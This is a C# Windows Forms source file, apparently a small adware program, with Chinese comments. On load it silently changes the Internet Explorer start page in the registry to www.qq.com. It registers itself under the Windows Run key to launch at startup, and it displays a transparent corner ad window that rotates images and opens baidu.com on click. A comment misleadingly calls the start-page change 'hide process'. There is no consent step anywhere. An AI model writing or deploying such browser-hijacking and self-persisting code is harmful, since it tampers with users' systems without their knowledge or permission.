using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Timers;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace WbSystem
{
    public partial class AdForm : Form
    {
        public AdForm()
        {
            InitializeComponent();
        }
        public string pictureUrl = "";
        /// <summary>
        ///  修改IE首页
        /// </summary>
        /// <param name="IEpageUrl">IEurl</param>
        
        public void ChageIEFiest(string IEpageUrl)
        {

            RegistryKey pregkey;
            pregkey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Explorer\main", true);
            pregkey.SetValue("Start Page", @IEpageUrl);//设置键值
           
        }
        /// <summary>
        /// 开机启动
        /// </summary>
        /// <param name="from">窗体名字</param>
        public void FromRegistryStart(Form from)
        {
            RegistryKey regKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            try
            {
                regKey.SetValue(from.Name, Application.ExecutablePath);
               // regKey.DeleteValue(from .Name );
            }
            catch (Exception ex)
            {
                MessageBox.Show("不存在启动项路径！");
            }
        }
        private void AdForm_Load(object sender, EventArgs e)
        {
            try
            {
                //获取图片路径
                pictureUrl = Application.StartupPath;
                //设置Ad图片位置
                this.Top = 0;
                this.Left = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width - this.Width;

                //设置背景为透明
                this.BackColor = Color.FromArgb(255, 200, 0);
                this.TransparencyKey = BackColor;

                //调用timer事件
                System.Timers.Timer td = new System.Timers.Timer(1500);
                td.Elapsed += new System.Timers.ElapsedEventHandler(UpdateAdPicture);
                td.AutoReset = true;
                td.Start();

                //显示Ad广告窗体
                BackForm bf = new BackForm();
                bf.Show();

                //隐藏进程    
                ChageIEFiest("www.qq.com");
                //开机启动
                AdForm ad = new AdForm();
                FromRegistryStart(ad);

             
            }
            catch(Exception ex )
            {
                MessageBox.Show(ex.Message);
            }
        }
        private void UpdateAdPicture(object sender, System.Timers.ElapsedEventArgs e)
        {
            try
            {
                //获取根目录
                string CurrentDir = pictureUrl;
               // string CurrentDir = Directory.GetCurrentDirectory();

                string FileNameA =  @"\AdPictureA\";
                pictureAd1.Image = GetPictureFile(CurrentDir, FileNameA);
               
                string FileNameB = @"\AdPictureB\";
                pictureAd2.Image = GetPictureFile(CurrentDir, FileNameB);

                string FileNameC =  @"\AdPictureC\";
                pictureAd3.Image = GetPictureFile(CurrentDir, FileNameC);

                string FileNameD =  @"\AdPictureD\";
                pictureAd4.Image=GetPictureFile(CurrentDir,FileNameD);

            }
            catch
            {
                return;
            }
        }
        /// <summary>
        /// 实现文件读取方法
        /// </summary>
        /// <param name="CurrentDir"></param>
        /// <param name="FileName"></param>
        /// <returns></returns>
        Image GetPictureFile(string CurrentDir,string FileName)
        {
           
                //存储图片路径
                string PicturePath = null;
                //以此为根目录,读取filename下面的文件,存储到PictureFiles
                string[] PictureFiles = Directory.GetFiles(CurrentDir + FileName);
                Random rd = new Random();
                //使用数组下标，取得文件名
                PicturePath = PictureFiles[rd.Next(0, PictureFiles.Length - 1)];
                return System.Drawing.Image.FromFile(PicturePath);
         
        }

        //读取广告图片文件
        private void pictureAd2_Click(object sender, EventArgs e)
        {
            Process.Start("www.baidu.com");
        }

        private void pictureAd3_Click(object sender, EventArgs e)
        {
            Process.Start("www.baidu.com");
        }

        private void pictureAd4_Click(object sender, EventArgs e)
        {
            Process.Start("www.baidu.com");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void pictureAd1_Click_1(object sender, EventArgs e)
        {
            Process.Start("www.baidu.com");
        }
    
    }
     
}
